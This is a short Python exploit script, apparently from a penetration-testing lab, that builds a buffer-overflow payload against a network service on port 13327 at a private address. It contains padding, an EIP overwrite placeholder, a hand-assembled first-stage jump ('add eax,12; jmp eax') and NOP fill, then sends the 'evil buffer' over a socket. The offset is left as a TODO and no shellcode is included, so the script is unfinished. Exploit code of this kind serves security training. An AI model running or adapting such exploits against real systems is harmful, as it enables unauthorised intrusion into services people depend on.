#!/usr/bin/python3
import socket

host = "192.168.221.44"

length = 4379

# msf-pattern_offset -q 46367046
# -> set the result as offset
# offset = # TODO

padding = b"\x41" * offset

eip = b"B" * 4

# msf-nasm_shell
#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
# len: 83 co 0c ff e0 -> 5 Bytes
len_first_stage = 5
first_stage = b"\x83\xc0\x0c\xff\xe0"

buffer = b"\x11(setup sound " + padding + eip + first_stage + b"\x90" * (length - offset - 4 - len_first_stage) + b"\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")

s.connect((host, 13327))
print(s.recv(1024))
s.send(buffer)

s.close()

print("[*]Payload Sent !")